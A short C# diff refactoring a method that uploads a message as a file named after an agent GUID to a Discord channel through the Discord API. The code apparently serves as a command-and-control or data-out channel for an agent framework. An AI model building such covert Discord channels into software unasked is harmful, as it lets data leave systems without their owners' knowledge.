@@ -232,31 +232,24 @@ namespace Profiles
             return JsonSerializer.Deserialize<List<ServerDetails>>(ResponseMessages) ?? new List<ServerDetails>(); // eithe return the responses Or if it fails get a derisalised response AKA with d ata or no data
         }
 
-        public async Task<bool> SendAttachment(string msg) //8mb by default, A file upload size limit applies to all files in a request 
+         public async Task<bool> SendAttachment(string msg) //8mb by default, A file upload size limit applies to all files in a request 
         {
             try
             {
-                byte[] msgBytes = System.Text.Encoding.UTF8.GetBytes(JsonSerializer.Serialize(msg));
-                using (MemoryStream memStream = new MemoryStream(msgBytes)) //8mb max filesize
+                var URL = "https://discord.com/api/channels/" + ChannelID + "/messages";
+                var Content = new MultipartFormDataContent();
+                byte[] msgBytes = Encoding.ASCII.GetBytes(msg);
+                
+                var File_Content = new ByteArrayContent(msgBytes);
+                File_Content.Headers.ContentType = new MediaTypeHeaderValue("multipart/form-data");
+                File_Content.Headers.ContentDisposition = new ContentDispositionHeaderValue("filename")
                 {
-                    var URL = "https://discord.com/api/channels/" + ChannelID + "/messages";
-                    var Content = new MultipartFormDataContent();
-                    var File_Content = new ByteArrayContent(await new StreamContent(memStream).ReadAsByteArrayAsync());
-                    File_Content.Headers.ContentType = new MediaTypeHeaderValue("multipart/form-data");
-                    File_Content.Headers.ContentDisposition = new ContentDispositionHeaderValue("filename")
-                    {
-                        FileName = agent_guid + ".server",
-                    };
-                    Content.Add(File_Content);
-                    var res = await discordClient.PostAsync(URL, Content);
+                    FileName = agent_guid + ".server",
+                };
+                Content.Add(File_Content);
+                var res = await discordClient.PostAsync(URL, Content);
 
-
-                    if (res.IsSuccessStatusCode)
-                    {
-                        return true;
-                    }
-                    return false;
-                }
+                return res.IsSuccessStatusCode;
             }
             catch (Exception e)
             {
